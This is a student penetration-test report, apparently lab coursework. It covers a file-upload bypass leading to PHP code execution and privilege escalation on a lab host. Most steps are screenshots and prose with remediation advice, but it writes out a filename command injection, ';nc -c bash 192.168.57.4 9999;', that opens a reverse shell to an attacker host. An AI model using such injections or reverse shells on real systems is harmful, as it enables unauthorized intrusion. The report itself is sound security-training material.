---
title: "Offensive Security Checkpoint 01"
author: ["RM87187@fiap.com.br, RM86663@fiap.com.br, RM87101@fiap.com.br, RM87079@fiap.com.br, RM88582@fiap.com.br"]
date: "2022-09-01"
subject: "Pentest report"
subtitle: "OSCP like exam report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security OSCP like exam report


## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The students is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.

# High level summary

I was tasked with conducting an internal penetration test for the offensive security exam.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to carry out attacks, similar to those of a hacker and try to infiltrate the machine chosen by the teacher.
My overall goal was to assess the target and escalate privilege on the machine.
During internal penetration testing, several alarming vulnerabilities were identified in the target.

## Recommendations

We recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit this system in the future.

# Methodologies

We use a widely adopted approach to performing penetration testing.
Below is a summary of how we were able to identify and exploit each individual vulnerability found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, we were tasked with exploiting the target chosen by teacher.
The specific IP addresses were:

- 192.168.57.5

#### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.57.5      | **TCP**: 22,80,443\
		    

**Nmap Scan Results:**

![Nmap scan](path/imagem1.jpg)

*Initial Shell Vulnerability Exploited*

When enumerating the HTTP service, a "backup" directory was identified that has a directory listing issue and gave us access to a compressed file called "backup.tar".
![Directory Listing](path/imagem2.jpg)

After unzipping the file we can read the source codes:
![Source code - upload](path/uploadphp.jpg)
![Source code - lib](path/libphp1.jpg)
![Source code - lib](path/libphp2.jpg)

Analyzing the code, we can see that it checks if the file size is smaller than 60,000, checks if a file is actually being uploaded and checks if the file extension matches any of those in a predefined list. For that it uses the "getnameUpload" function, which exists in the "lib.php" file that is imported for use in the upload form.
This "getnameUpload" function creates a variable called "pieces" and splits the filename into parts, the "name" variable takes these pieces and replaces "." by "_" and the variable "ext" takes the last part after the "." to check the extension.
So when PHP executes the function, PHP takes the name of the image, for example "gabriel.png", reads it as an array and separates it into parts.
part 0 = gabriel
part 1 = png
It executes the variable "name" which has the value "gabriel", tries to replace all "." by "_" but as it has none, the value remains "gabriel" and executes the variable "ext" which has the value "png".
Now if we use the example "gabriel.php.png" PHP will separate it into 3 parts:
part 0 = gabriel
part 1 = php
Part 2 = png
The variable "name" still has the value "gabriel", it tries to replace all the "." by "_" but as it doesn't have any value, it's still "gabriel", but this time the variable "ext" will have "php.png" as its value.
We can also see a function called "check_file_type" that is checking the magic bytes of the file being uploaded, which means that just changing the extension in this case would not work, as the file must actually have the magic byte of a png or another file listed in the array earlier.

![Bless](path/bless.jpg)

After creating a PHP shell with the characteristics that we have already identified as being necessary, we get an RCE in the application.
![Uploading](path/requisicao.jpg)
![RCE](path/rce.jpg)

Using python we got the reverse shell.
![Reverse](path/reverse.jpg)


**Vulnerability Explanation: In this case, there were several vulnerabilities that led to the initial compromisement of the target, such as information disclosure due directory listing and unrestricted file upload.**

**Vulnerability Fix:
Directory listing can be disabled in the webserver configuration file.
To solve the information disclosure you can change the permission of the file "backup.tar".
Ways to fix unrestricted file upload issue:
- The file types allowed to be uploaded should be restricted to only those that are necessary for business functionality.
- Never accept a filename and its extension directly without having an allow list filter.
- The application should perform filtering and content checking on any files which are uploaded to the server. Files should be thoroughly scanned and validated before being made available to other users. If in doubt, the file should be discarded.**

**Severity: Critical**

**user.txt Proof Screenshot**
![Guly](path/gulyflag.jpg)


#### Privilege Escalation

When accessing the user directory "guly" we do not have permission to read the file "user.txt", however reading the file "crontab.guly" we can see that there is a configuration that executes the file "/home/guly/check_attack. php" every 3 minutes.
![Crontab](path/crontab.jpg)

So when reading the file check_attacks.php we can see a variable "$path" that has the static value defined as "/var/www/html/uploads", however the variable "value" is created receiving the input of "files".
The variable "files" is using PHP's "scandir" function passing the value "." meaning it wants to list all files and directories in THIS directory. Which means that if we create a file putting malicious content in the name PHP will probably try to execute it.
So, creating a file called ";nc -c bash 192.168.57.4 9999;" we can get a reverse shell as guly because in line code would be: "exec("nohup /bin/rm -f /var/www/html/uploads;nc -c bash 192.168.57.4 9999; > /dev/null 2>&1 &")"
![Malicious file](path/arquivomalicioso.jpg)
![Reverse as guly](path/reverseasguly.jpg)
![Guly](path/gulyflag.jpg)

After being as guly we run the command "sudo -l" and notice that there is a script that we have permission to run as root.
![SUID file](path/suid.jpg)

The script contains some variables with static content but others that are received by user input, and when it comes to network script where the variable format is "test=gabriel", then if we add a space after the term "gabriel" and we write, that term will be executed.
![Privesc](path/privesc.jpg)

*Additional Priv Esc info*

**Vulnerability Exploited: Command injection in the "check_attacks.php" script and abuse of network script with SUID.**

**Vulnerability Explanation: These vulnerabilities allowed command injection only by not handling user input and reflecting it directly in the script **

**Vulnerability Fix:Fix check_attacks.php handling with user input**

**Severity: Critical**

**Proof Screenshot Here:**
![Privesc](path/privesc.jpg)
